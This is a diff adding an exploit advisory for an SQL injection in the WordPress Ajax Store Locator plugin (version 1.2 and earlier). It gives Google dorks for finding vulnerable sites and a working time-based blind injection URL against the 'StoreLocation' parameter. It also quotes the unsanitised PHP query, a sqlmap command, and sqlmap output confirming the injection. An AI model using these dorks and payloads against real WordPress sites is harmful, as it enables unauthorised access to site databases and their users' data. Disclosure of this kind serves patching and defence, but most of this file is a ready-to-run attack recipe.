@@ -1,0 +1,79 @@
+######################
+
+# Exploit Title : Wordpress Ajax Store Locator <= 1.2 SQL Injection Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356
+
+# Software Link : Premium
+
+# Dork Google: inurl:ajax-store-locator
+#              index of ajax-store-locator      
+
+# Date : 2015-03-29
+
+# Tested on : Windows 7 / Mozilla Firefox
+#             Linux / Mozilla Firefox
+
+######################
+
+# Info:
+
+ The "sl_dal_searchlocation_cbf" ajax function is affected from SQL Injection vulnerability
+ 
+ "StoreLocation" var is not sanitized
+
+# PoC Exploit:
+
+ http://TARGET/wordpress/wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1 AND (SELECT * FROM (SELECT(SLEEP(10)))LCKZ)
+ 
+ StoreLocation's value must contain "~" delimiter
+ 
+ $storeLoc = $_REQUEST["StoreLocation"];
+ ...
+ ...
+ $qryVal = explode("~", $storeLoc);
+ $sql_query = "SELECT a.*,b.*, 0 as ......... LEFT JOIN `$sl_tb_pluginset` as b ON (1=1)  WHERE a.id=$qryVal[1]"
+
+# PoC sqlmap:
+
+ sqlmap -u "http://TARGET/wordpress/wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1" -p StoreLocation --dbms mysql
+
+ [18:24:11] [INFO] GET parameter 'StoreLocation' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
+ for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+ [18:24:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+ [18:24:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+ [18:24:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+ [18:24:29] [INFO] checking if the injection point on GET parameter 'StoreLocation' is a false positive
+ GET parameter 'StoreLocation' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+ sqlmap identified the following injection points with a total of 89 HTTP(s) requests:
+ ---
+ Parameter: StoreLocation (GET)
+     Type: AND/OR time-based blind
+     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+     Payload: action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1 AND (SELECT * FROM (SELECT(SLEEP(5)))LCKZ)
+ ---
+ [18:29:48] [INFO] the back-end DBMS is MySQL
+ web server operating system: Linux CentOS 5.10
+ web application technology: PHP 5.3.3, Apache 2.2.3
+ back-end DBMS: MySQL 5.0.12
+ 
+
+ 
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+                http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit)
+				http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+				
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
